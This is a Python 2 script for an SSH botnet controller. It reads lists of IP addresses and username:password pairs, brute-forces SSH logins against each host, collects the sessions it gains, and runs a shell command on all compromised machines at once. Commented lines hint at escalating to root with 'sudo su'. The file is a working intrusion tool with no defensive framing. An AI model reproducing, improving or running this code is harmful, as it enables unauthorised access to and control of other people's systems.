#!/usr/bin/python
import pxssh
from pexpect import *
import pexpect
import PySweeper
import sys
import time
import signal
from time import sleep

class Client:

    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            print_color("[+] Connection successful!", "green")
            return s
        except Exception, e:
            print_color("[-] Connection timed out.", "red")

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print "[*] Output from " + client.host
        print output

def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)

def print_color(text, color):
    if color is "green":
        print("\033[92m" + text + "\033[0m")
    elif color is "red":
        print("\033[91m" + text + "\033[0m")
    elif color is "yellow":
        print("\033[93m" + text + "\033[0m")
    else:
        print(text + "\nColor not found!")

def TimeoutHandler(signum, frame):
    raise TimeoutException

OriginalHandler = signal.signal(signal.SIGALRM, TimeoutHandler)
botNet = []

with open('/etc/ips') as f:
    ips = [x.strip() for x in f.readlines()]

with open('/etc/pass') as f:
    credentials = [x.strip().split(':') for x in f.readlines()]

for ip in ips:
    for user, passwd in credentials:
        print_color("[*] Connecting to: " + user + "@" + ip + " P" + str(credentials.index([user , passwd]) + 1), "yellow")
        signal.alarm(6)
        client = Client(ip, user, passwd)
        if client.session is None:
            pass
        else:
            #client.send_command("sudo su")
            #client.session.sendline(passwd)
            botNet.append(client)
            break

botnetCommand("ls")
